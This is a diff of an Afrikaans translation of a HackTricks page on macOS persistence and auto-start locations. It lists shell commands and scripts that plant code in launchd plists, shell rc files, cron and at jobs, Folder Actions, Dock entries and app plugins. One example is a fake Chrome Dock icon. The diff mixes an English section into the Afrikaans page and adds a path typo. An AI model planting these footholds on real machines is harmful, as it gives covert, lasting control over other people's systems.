@@ -6,7 +6,7 @@
 
 Ander maniere om HackTricks te ondersteun:
 
-* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
+* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -50,14 +50,14 @@ Hier kan jy selfbeginlokasies vind wat nuttig is vir **sandbox-oorweging** wat j
 
 **`launchd`** is die **eerste** **proses** wat deur die OX S-kernel by opstart uitgevoer word en die laaste om af te sluit. Dit behoort altyd die **PID 1** te hê. Hierdie proses sal die konfigurasies wat in die **ASEP** **plists** aangedui word, **lees en uitvoer** in:
 
-* `/Library/LaunchAgents`: Per-gebruiker-agente geïnstalleer deur die administrateur
-* `/Library/LaunchDaemons`: Stelselwye duiwels geïnstalleer deur die administrateur
-* `/System/Library/LaunchAgents`: Per-gebruiker-agente voorsien deur Apple.
-* `/System/Library/LaunchDaemons`: Stelselwye duiwels voorsien deur Apple.
+* `/Library/LaunchAgents`: Per-gebruiker-agente wat deur die administrateur geïnstalleer is
+* `/Library/LaunchDaemons`: Stelselwye duiwels wat deur die administrateur geïnstalleer is
+* `/System/Library/LaunchAgents`: Per-gebruiker-agente wat deur Apple voorsien word.
+* `/System/Library/LaunchDaemons`: Stelselwye duiwels wat deur Apple voorsien word.
 
 Wanneer 'n gebruiker aanmeld, word die plists wat in `/Users/$USER/Library/LaunchAgents` en `/Users/$USER/Library/LaunchDemons` geleë is, gestart met die **toestemmings van die aangemelde gebruikers**.
 
-Die **hoofverskil tussen agente en duiwels is dat agente gelaai word wanneer die gebruiker aanmeld en die duiwels gelaai word by stelselopstart** (aangesien daar dienste soos ssh is wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel kry). Agente kan ook GUI gebruik terwyl duiwels in die agtergrond moet hardloop.
+Die **hoofverskil tussen agente en duiwels is dat agente gelaai word wanneer die gebruiker aanmeld en die duiwels gelaai word by stelselopstart** (aangesien daar dienste soos ssh is wat uitgevoer moet word voordat enige gebruiker toegang tot die stelsel kry). Agente mag ook GUI gebruik terwyl duiwels in die agtergrond moet hardloop.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
@@ -80,30 +80,30 @@ Die **hoofverskil tussen agente en duiwels is dat agente gelaai word wanneer die
 </dict>
 </plist>
 ```
-Daar is gevalle waar 'n **agent moet uitgevoer word voordat die gebruiker aanmeld**, hierdie word genoem **PreLoginAgents**. Byvoorbeeld, dit is nuttig om ondersteunende tegnologie by aanmelding te voorsien. Hulle kan ook gevind word in `/Library/LaunchAgents` (sien [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) 'n voorbeeld).
+Daar is gevalle waar 'n **agent uitgevoer moet word voordat die gebruiker aanmeld**, hierdie word genoem **PreLoginAgents**. Byvoorbeeld, dit is nuttig om ondersteunende tegnologie by aanmelding te voorsien. Hulle kan ook gevind word in `/Library/LaunchAgents` (sien [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) 'n voorbeeld).
 
 {% hint style="info" %}
 Nuwe Daemons of Agents konfigurasie lêers sal **gelaai word na die volgende herlaai of deur gebruik te maak van** `launchctl load <target.plist>` Dit is **ook moontlik om .plist lêers sonder daardie uitbreiding te laai** met `launchctl -F <file>` (egter sal daardie plist lêers nie outomaties gelaai word na herlaai nie).\
-Dit is ook moontlik om **te ontlas** met `launchctl unload <target.plist>` (die proses wat daarna verwys word sal beëindig word),
+Dit is ook moontlik om **te ontlas** met `launchctl unload <target.plist>` (die proses wat daardeur aangedui word, sal beëindig word),
 
-Om **te verseker** dat daar nie **iets** (soos 'n oorskrywing) is wat 'n **Agent** of **Daemon** **verhoed om** **uitgevoer te word** voer uit: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
+Om **te verseker** dat daar nie **iets** (soos 'n oorskrywing) is wat 'n **Agent** of **Daemon** **verhoed om** **uitgevoer te word** nie, hardloop: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
 {% endhint %}
 
-Lys alle agents en daemons wat deur die huidige gebruiker gelaai is:
+Lys al die agente en daemons wat deur die huidige gebruiker gelaai is:
 ```bash
 launchctl list
 ```
 {% hint style="warning" %}
-Indien 'n plist deur 'n gebruiker besit word, selfs al is dit in 'n daemon-stelselwyde gids, sal die taak as die gebruiker uitgevoer word en nie as root nie. Dit kan sommige voorregskaleringaanvalle voorkom.
+Indien 'n plist deur 'n gebruiker besit word, selfs al is dit in 'n daemon-stelselwye gids, sal die taak as die gebruiker uitgevoer word en nie as root nie. Dit kan sommige voorreg-escalasie aanvalle voorkom.
 {% endhint %}
 
 ### skulpaanvang lêers
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
-Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)
+Uiteensetting: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
+Uiteensetting (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)
 
 * Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
-* TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
+* TCC Omseiling: [✅](https://emojipedia.org/check-mark-button)
 * Maar jy moet 'n toepassing met 'n TCC-omseiling vind wat 'n skulpaanvang uitvoer wat hierdie lêers laai
 
 #### Liggings
@@ -128,9 +128,9 @@ Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://the
 
 #### Beskrywing & Uitbuiting
 
-Wanneer 'n skulpaanvangomgewing soos `zsh` of `bash` geïnisieer word, **word sekere aanvanglêers uitgevoer**. macOS gebruik tans `/bin/zsh` as die verstekskul. Hierdie skul word outomaties benader wanneer die Terminal-toepassing geopen word of wanneer 'n toestel via SSH benader word. Alhoewel `bash` en `sh` ook teenwoordig is in macOS, moet hulle uitdruklik aangeroep word om gebruik te word.
+Wanneer 'n skulpaanvang-omgewing soos `zsh` of `bash` geïnisieer word, **word sekere aanvangslêers uitgevoer**. macOS gebruik tans `/bin/zsh` as die verstekskul. Hierdie skul word outomaties benader wanneer die Terminal-toepassing geopen word of wanneer 'n toestel via SSH benader word. Alhoewel `bash` en `sh` ook teenwoordig is in macOS, moet hulle uitdruklik aangeroep word om gebruik te word.
 
-Die manbladsy van zsh, wat ons kan lees met **`man zsh`** het 'n lang beskrywing van die aanvanglêers.
+Die manbladsy van zsh, wat ons kan lees met **`man zsh`** het 'n lang beskrywing van die aanvangslêers.
 ```bash
 # Example executino via ~/.zshrc
 echo "touch /tmp/hacktricks" >> ~/.zshrc
@@ -149,7 +149,7 @@ Die konfigurasie van die aangeduide uitbuiting en uitlog en inlog of selfs herla
 #### Ligging
 
 * **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
-* **Trigger**: Heropen toepassings tydens herlaai
+* **Trigger**: Heropen toepassings na herlaai
 
 #### Beskrywing & Uitbuiting
 
@@ -165,7 +165,7 @@ defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
 #or
 plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
-Om 'n toepassing by hierdie lys te **voeg**, kan jy gebruik:
+Om **'n toepassing by hierdie lys te voeg** kan jy gebruik:
 ```bash
 # Adding iTerm2
 /usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
@@ -190,9 +190,9 @@ Om 'n toepassing by hierdie lys te **voeg**, kan jy gebruik:
 
 In **`~/Library/Preferences`** word die voorkeure van die gebruiker in die Toepassings gestoor. Sommige van hierdie voorkeure kan 'n konfigurasie hê om **ander toepassings/scripts uit te voer**.
 
-Byvoorbeeld, die Terminal kan 'n bevel uitvoer by die Begin:
+Byvoorbeeld, die Terminal kan 'n bevel by die Begin uitvoer:
 
-<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1145).png" alt="" width="495"><figcaption></figcaption></figure>
 
 Hierdie konfigurasie word weerspieël in die lêer **`~/Library/Preferences/com.apple.Terminal.plist`** soos dit:
 ```bash
@@ -212,7 +212,7 @@ Hierdie konfigurasie word weerspieël in die lêer **`~/Library/Preferences/com.
 ```
 Dus, as die plist van die voorkeure van die terminal in die stelsel oorskryf kan word, kan die **`open`** funksionaliteit gebruik word om **die terminal te open en daardie bevel uit te voer**.
 
-Jy kan dit van die opdraggelynstelsel toevoeg met:
+Jy kan dit van die opdraggelynstrook toevoeg met:
 ```bash
 # Add
 /usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
@@ -229,7 +229,7 @@ Jy kan dit van die opdraggelynstelsel toevoeg met:
 * TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
 * Terminal gebruik om FDA-toestemmings van die gebruiker te hê
 
-#### Plek
+#### Ligging
 
 * **Enige plek**
 * **Trigger**: Open Terminal
@@ -291,9 +291,9 @@ Uiteensetting: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](ht
 
 #### Beskrywing
 
-Volgens die vorige uiteensettings is dit moontlik om **sekere klankinvoegtoepassings te kombineer** en hulle te laai.
+Volgens die vorige uiteensettings is dit moontlik om **sekere klankinvoegtoepassings saam te stel** en hulle te laai.
 
-### QuickLook-invoegtoepassings
+### QuickLook Invoegtoepassings
 
 Uiteensetting: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)
 
@@ -311,7 +311,7 @@ Uiteensetting: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theev
 
 #### Beskrywing & Uitbuiting
 
-QuickLook-invoegtoepassings kan uitgevoer word wanneer jy die **voorbeeld van 'n lêer aktiveer** (druk die spatiebalk met die lêer gekies in Finder) en 'n **invoegtoepassing wat daardie lêertipe ondersteun** geïnstalleer is.
+QuickLook-invoegtoepassings kan uitgevoer word wanneer jy die **voorbeeld van 'n lêer' aktiveer** (druk die spatiebalk met die lêer gekies in Finder) en 'n **invoegtoepassing wat daardie lêertipe ondersteun** geïnstalleer is.
 
 Dit is moontlik om jou eie QuickLook-invoegtoepassing saam te stel, dit in een van die vorige ligginge te plaas om dit te laai en dan na 'n ondersteunde lêer te gaan en spasiëring te druk om dit te aktiveer.
 
@@ -370,15 +370,15 @@ Hier kan jy beginlokasies vind wat nuttig is vir **sandbox omgang** wat jou toel
 
 **Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)
 
-* Nuttig vir omgang met sandbox: [✅](https://emojipedia.org/check-mark-button)
+* Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
 * Jy moet egter in staat wees om die `crontab` binêre lêer uit te voer
 * Of wees root
-* TCC omgang: [🔴](https://emojipedia.org/large-red-circle)
+* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Lokasie
 
 * **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
-* Root benodig vir direkte skryftoegang. Geen root nodig as jy `crontab <lêer>` kan uitvoer nie
+* Root benodig vir direkte skryftoegang. Geen root benodig as jy `crontab <lêer>` kan uitvoer nie
 * **Trigger**: Afhanklik van die cron taak
 
 #### Beskrywing & Uitbuiting
@@ -389,14 +389,14 @@ crontab -l
 ```
 Jy kan ook al die cron take van die gebruikers sien in **`/usr/lib/cron/tabs/`** en **`/var/at/tabs/`** (benodig root).
 
-In MacOS kan verskeie folders gevind word wat skripte met **sekere frekwensie** uitvoer:
+In MacOS kan verskeie folders gevind word wat skripte met **sekere frekwensie** uitvoer in:
 ```bash
 # The one with the cron jobs is /usr/lib/cron/tabs/
 ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
 ```
 Daar kan jy die gewone **cron** **take**, die **at** **take** (nie baie gebruik nie) en die **periodic** **take** (hoofsaaklik gebruik vir skoonmaak van tydelike lêers) vind. Die daaglikse periodieke take kan byvoorbeeld uitgevoer word met: `periodic daily`.
 
-Om 'n **gebruiker cronjob programmaties** by te voeg, is dit moontlik om te gebruik:
+Om 'n **gebruikers cronjob programmaties** by te voeg, is dit moontlik om te gebruik:
 ```bash
 echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
 crontab /tmp/cron
@@ -429,21 +429,23 @@ EOF
 
 chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
 ```
-### macOS Automatiese Beginplekke
+### macOS Auto Start Locations
 
-In macOS is daar verskeie plekke waar programme outomaties begin as jy jou stelsel aan die gang sit. Dit sluit die volgende in:
+#### Launch Agents
 
-1. **/Library/LaunchAgents/**
-2. **/Library/LaunchDaemons/**
-3. **/Library/StartupItems/**
-4. **/System/Library/LaunchAgents/**
-5. **/System/Library/LaunchDaemons/**
-6. **/System/Library/StartupItems/**
-7. **~/Library/LaunchAgents/**
-8. **~/Library/LaunchDaemons/**
-9. **~/Library/StartupItems/**
+Launch Agents are used to run processes when a user logs in. They are located in `~/Library/LaunchAgents/` and `/Library/LaunchAgents/`.
 
-Dit is belangrik om hierdie beginplekke te monitor en te bestuur om te verseker dat slegs goedgekeurde programme begin wanneer jy jou stelsel opstart.
+#### Launch Daemons
+
+Launch Daemons are used to run processes at system boot or login. They are located in `/Library/LaunchDaemons/` and `/System/Library/LaunchDaemons/`.
+
+#### Login Items
+
+Login Items are applications that open when a user logs in. They can be managed in System Preferences > Users & Groups > Login Items.
+
+#### Startup Items
+
+Startup Items are legacy items that automatically launch when a user logs in. They are located in `/Library/StartupItems/`.
 ```bash
 cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
 #!/usr/bin/env python3
@@ -468,7 +470,7 @@ Die iTerm2-voorkeure geleë in **`~/Library/Preferences/com.googlecode.iterm2.pl
 
 Hierdie instelling kan in die iTerm2-instellings gekonfigureer word:
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (34).png" alt="" width="563"><figcaption></figcaption></figure>
 
 En die bevel word weerspieël in die voorkeure:
 ```bash
@@ -496,26 +498,26 @@ open /Applications/iTerm.app/Contents/MacOS/iTerm2
 {% endcode %}
 
 {% hint style="warning" %}
-Daar is 'n hoë waarskynlikheid dat daar **ander maniere is om die iTerm2 voorkeure** te misbruik om arbitrêre bevele uit te voer.
+Dit is hoogs waarskynlik dat daar **ander maniere is om die iTerm2-voorkeure** te misbruik om willekeurige bevele uit te voer.
 {% endhint %}
 
 ### xbar
 
-Bespreking: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)
+Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)
 
 * Nuttig om sandboks te omseil: [✅](https://emojipedia.org/check-mark-button)
 * Maar xbar moet geïnstalleer wees
-* TCC omseiling: [✅](https://emojipedia.org/check-mark-button)
+* TCC-omseiling: [✅](https://emojipedia.org/check-mark-button)
 * Dit vra om Toeganklikheidsregte
 
 #### Ligging
 
 * **`~/Library/Application\ Support/xbar/plugins/`**
-* **Trigger**: Wanneer xbar uitgevoer word
+* **Trigger**: Eenmaal xbar uitgevoer word
 
 #### Beskrywing
 
-As die gewilde program [**xbar**](https://github.com/matryer/xbar) geïnstalleer is, is dit moontlik om 'n skaalskrip te skryf in **`~/Library/Application\ Support/xbar/plugins/`** wat uitgevoer sal word wanneer xbar begin:
+As die gewilde program [**xbar**](https://github.com/matryer/xbar) geïnstalleer is, is dit moontlik om 'n skulpskrip te skryf in **`~/Library/Application\ Support/xbar/plugins/`** wat uitgevoer sal word wanneer xbar begin word:
 ```bash
 cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
 #!/bin/bash
@@ -539,7 +541,7 @@ chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
 
 #### Beskrywing
 
-[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as 'n outomatiseringsplatform vir **macOS**, wat die **LUA-skripsingstaal** benut vir sy werksaamhede. Merkwaardig genoeg ondersteun dit die integrasie van volledige AppleScript-kode en die uitvoering van skulpskripte, wat sy skripskundigheid aansienlik verbeter.
+[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dien as 'n outomatiseringsplatform vir **macOS**, wat die **LUA-skripseltaal** benut vir sy werksaamhede. Dit ondersteun veral die integrasie van volledige AppleScript-kode en die uitvoering van skulpskripte, wat sy skripskapsiteite aansienlik verbeter.
 
 Die program soek na 'n enkele lêer, `~/.hammerspoon/init.lua`, en wanneer dit begin word die skrip uitgevoer.
 ```bash
@@ -559,7 +561,7 @@ EOF
 
 * `~/Library/Application Support/BetterTouchTool/*`
 
-Hierdie instrument maak dit moontlik om aansoeke of skripte aan te dui wat uitgevoer moet word wanneer sekere snelkoppeling gedruk word. 'n Aanvaller kan sy eie **snelkoppeling en aksie om in die databasis uit te voer** configureer om dit arbitrêre kode te laat uitvoer (‘n snelkoppeling kan net wees om net ‘n sleutel te druk).
+Hierdie instrument maak dit moontlik om aansoeke of skripte aan te dui om uit te voer wanneer sekere snelkoppeling gedruk word. 'n Aanvaller kan sy eie **snelkoppeling en aksie om uit te voer in die databasis** instel om dit arbitrêre kode uit te voer ( 'n snelkoppeling kan net wees om 'n sleutel te druk).
 
 ### Alfred
 
@@ -572,7 +574,7 @@ Hierdie instrument maak dit moontlik om aansoeke of skripte aan te dui wat uitge
 
 * `???`
 
-Dit maak dit moontlik om werksvloei te skep wat kode kan uitvoer wanneer sekere voorwaardes voldoen is. Potensieel is dit moontlik vir ‘n aanvaller om ‘n werksvloei-lêer te skep en Alfred dit te laat laai (dit is nodig om die premie weergawe te betaal om werksvloeie te gebruik).
+Dit maak dit moontlik om werksvloei te skep wat kode kan uitvoer wanneer sekere voorwaardes bereik word. Potensieel is dit moontlik vir 'n aanvaller om 'n werksvloei-lêer te skep en Alfred dit te laat laai (dit is nodig om die premie weergawe te betaal om werksvloei te gebruik).
 
 ### SSHRC
 
@@ -592,7 +594,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.
 * **Trigger**: Aanteken via ssh
 
 {% hint style="danger" %}
-Om ssh aan te sit, vereis Volle Skyf Toegang:
+Om ssh aan te skakel, vereis Volle Skyf Toegang:
 ```bash
 sudo systemsetup -setremotelogin on
 ```
@@ -610,7 +612,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.
 * Maar jy moet `osascript` met argumente uitvoer
 * TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Liggings
+#### Lokasies
 
 * **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
 * **Trigger:** Inlog
@@ -635,13 +637,13 @@ osascript -e 'tell application "System Events" to delete login item "itemname"'
 ```
 Hierdie items word gestoor in die lêer **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
 
-**Aanmeldingsitems** kan ook aangedui word deur die API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) te gebruik wat die konfigurasie in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** sal stoor
+**Aanmeldingsitems** kan **ook** aangedui word deur die API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) te gebruik wat die konfigurasie in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** sal stoor
 
 ### ZIP as Aanmeldingsitem
 
 (Kyk na die vorige afdeling oor Aanmeldingsitems, dit is 'n uitbreiding)
 
-As jy 'n **ZIP**-lêer as 'n **Aanmeldingsitem** stoor, sal die **`Archive Utility`** dit oopmaak en as die zip byvoorbeeld in **`~/Library`** gestoor was en die Map **`LaunchAgents/file.plist`** met 'n agterdeur bevat het, sal daardie map geskep word (dit is nie standaard nie) en die plist sal bygevoeg word sodat die volgende keer as die gebruiker weer aanmeld, die **agterdeur wat in die plist aangedui word, uitgevoer sal word**.
+As jy 'n **ZIP**-lêer as 'n **Aanmeldingsitem** stoor, sal die **`Archive Utility`** dit oopmaak en as die zip byvoorbeeld gestoor was in **`~/Library`** en die Map **`LaunchAgents/file.plist`** met 'n agterdeur bevat het, sal daardie map geskep word (dit is nie standaard nie) en die plist sal bygevoeg word sodat die volgende keer as die gebruiker weer aanmeld, die **agterdeur wat in die plist aangedui word, uitgevoer sal word**.
 
 'n Ander opsie sou wees om die lêers **`.bash_profile`** en **`.zshenv`** binne die gebruiker se TUIS te skep sodat as die map LaunchAgents reeds bestaan, sal hierdie tegniek steeds werk.
 
@@ -651,7 +653,7 @@ Beskrywing: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilb
 
 * Nuttig om sandput te omseil: [✅](https://emojipedia.org/check-mark-button)
 * Maar jy moet **`at`** **uitvoer** en dit moet **geaktiveer** wees
-* TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)
+* TCC omseiling: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Plek
 
@@ -659,7 +661,7 @@ Beskrywing: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilb
 
 #### **Beskrywing**
 
-`at` take is ontwerp vir **skedulering van eenmalige take** om uitgevoer te word op sekere tye. Anders as cron take, word `at` take outomaties verwyder na uitvoering. Dit is noodsaaklik om te let dat hierdie take volhoubaar is oor stelselherlaai, wat hulle potensiële sekuriteitskwessies onder sekere omstandighede maak.
+`at` take is ontwerp vir **skedulering van eenmalige take** om uitgevoer te word op sekere tye. Anders as cron take, word `at` take outomaties verwyder na uitvoering. Dit is noodsaaklik om te let dat hierdie take volhoubaar is oor stelselherlaai, wat hulle potensiële veiligheidskwessies onder sekere omstandighede maak.
 
 Standaard is hulle **uitgeschakel** maar die **root** gebruiker kan **hulle aktiveer** met:
 ```bash
@@ -669,13 +671,13 @@ Dit sal 'n lêer skep binne 1 uur:
 ```bash
 echo "echo 11 > /tmp/at.txt" | at now+1
 ```
-Kontroleer die werksopdrag ry met `atq:`
+Kontroleer die werksopdrag ry met behulp van `atq:`
 ```shell-session
 sh-3.2# atq
 26	Tue Apr 27 00:46:00 2021
 22	Wed Apr 28 00:29:00 2021
 ```
-Bokant kan ons twee geskeduleerde take sien. Ons kan die besonderhede van die taak afdruk deur `at -c JOBNUMMER` te gebruik.
+Bokant kan ons twee geskeduleerde take sien. Ons kan die besonderhede van die taak afdruk deur `at -c JOBNOMMER` te gebruik.
 ```shell-session
 sh-3.2# at -c 26
 #!/bin/sh
@@ -729,8 +731,8 @@ As ons die taaklêer druk, vind ons dat dit dieselfde inligting bevat as wat ons
 
 ### Voueraksies
 
-Verslag: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
-Verslag: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
+Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
+Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
 
 * Nuttig om sandput te omseil: [✅](https://emojipedia.org/check-mark-button)
 * Maar jy moet in staat wees om `osascript` met argumente te roep om **`System Events`** te kontak om Voueraksies te kan konfigureer
@@ -740,7 +742,7 @@ Verslag: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-89
 #### Ligging
 
 * **`/Library/Scripts/Folder Action Scripts`**
-* Wortel vereis
+* Root benodig
 * **Trigger**: Toegang tot die gespesifiseerde vouer
 * **`~/Library/Scripts/Folder Action Scripts`**
 * **Trigger**: Toegang tot die gespesifiseerde vouer
@@ -766,11 +768,11 @@ app.doShellScript("touch ~/Desktop/folderaction.txt");
 app.doShellScript("mkdir /tmp/asd123");
 app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
-Om die bogenoemde skrips bruikbaar te maak vir Voueraksies, kompileer dit met:
+Om die bogenoemde skrips bruikbaar te maak deur middel van Vouerhandelinge, kompileer dit met:
 ```bash
 osacompile -l JavaScript -o folder.scpt source.js
 ```
-Na die skrip is saamgestel, stel Folder-aksies op deur die onderstaande skrip uit te voer. Hierdie skrip sal Folder-aksies wêreldwyd aktiveer en spesifiek die vroeër saamgestelde skrip aan die Skermblad-map koppel.
+Na die skrip is saamgestel, stel Folder-aksies op deur die onderstaande skrip uit te voer. Hierdie skrip sal Folder-aksies wêreldwyd aktiveer en spesifiek die vroeër saamgestelde skrip aan die Skermblad-knipsel koppel.
 ```javascript
 // Enabling and attaching Folder Action
 var se = Application("System Events");
@@ -799,7 +801,7 @@ app.doShellScript("cp -R ~/Desktop /tmp/asd123");
 ```
 {% endcode %}
 
-Kompilieer dit met: `osacompile -l JavaScript -o folder.scpt source.js`
+Kompilieer dit met: `osacompile -l JavaScript -o folder.scpt bron.js`
 
 Skuif dit na:
 ```bash
@@ -808,7 +810,7 @@ mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 ```
 Dan, open die `Folder Actions Setup`-toep, kies die **gids wat jy wil dophou** en kies in jou geval **`folder.scpt`** (in my geval het ek dit output2.scp genoem):
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (36).png" alt="" width="297"><figcaption></figcaption></figure>
 
 Nou, as jy daardie gids met **Finder** oopmaak, sal jou skripsie uitgevoer word.
 
@@ -820,7 +822,7 @@ Nou, laat ons probeer om hierdie volharding sonder GUI-toegang voor te berei:
 * `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
 2. **Verwyder** die Gidsaksies wat jy net ingestel het:
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
 
 Nou dat ons 'n leë omgewing het
 
@@ -842,11 +844,11 @@ Skrywe: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.g
 #### Ligging
 
 * `~/Library/Preferences/com.apple.dock.plist`
-* **Trigger**: Wanneer die gebruiker op die toep binne die dok klik
+* **Trigger**: Wanneer die gebruiker op die toep binne die dock kliek
 
 #### Beskrywing & Uitbuiting
 
-Al die toepassings wat in die Dok verskyn, word gespesifiseer binne die plist: **`~/Library/Preferences/com.apple.dock.plist`**
+Al die toepassings wat in die Dock verskyn, word gespesifiseer binne die plist: **`~/Library/Preferences/com.apple.dock.plist`**
 
 Dit is moontlik om **'n toepassing by te voeg** net met:
 
@@ -860,7 +862,7 @@ killall Dock
 ```
 {% endcode %}
 
-Deur van **sosiale ingenieurswese** gebruik te maak, kan jy byvoorbeeld as Google Chrome voorgee binne die dok en jou eie skripsie werklik uitvoer:
+Deur van **sosiale ingenieurswese** gebruik te maak, kan jy byvoorbeeld **Google Chrome naboots in die dok en jou eie skrip uitvoer:**
 ```bash
 #!/bin/sh
 
@@ -915,7 +917,7 @@ killall Dock
 ```
 ### Kleurkiesers
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)
+Verslag: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)
 
 * Nuttig om sandboks te omseil: [🟠](https://emojipedia.org/large-orange-circle)
 * 'n Baie spesifieke aksie moet plaasvind
@@ -925,7 +927,7 @@ Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.g
 #### Ligging
 
 * `/Library/ColorPickers`
-* Root benodig
+* Wortel vereis
 * Trigger: Gebruik die kleurkieser
 * `~/Library/ColorPickers`
 * Trigger: Gebruik die kleurkieser
@@ -965,7 +967,7 @@ Let daarop dat die binêre lading van jou biblioteek 'n **baie beperkende sandbo
 
 'n Toepassingsvoorbeeld met 'n Finder Sync-uitbreiding [**kan hier gevind word**](https://github.com/D00MFist/InSync).
 
-Toepassings kan `Finder Sync-uitbreidings` hê. Hierdie uitbreiding sal binne 'n toepassing gaan wat uitgevoer sal word. Verder moet die uitbreiding in staat wees om sy kode uit te voer, dit **moet onderteken** wees met 'n geldige Apple-ontwikkelaarsertifikaat, dit moet **gesandboks** wees (hoewel ontspanne uitsonderings bygevoeg kan word) en dit moet geregistreer wees met iets soos:
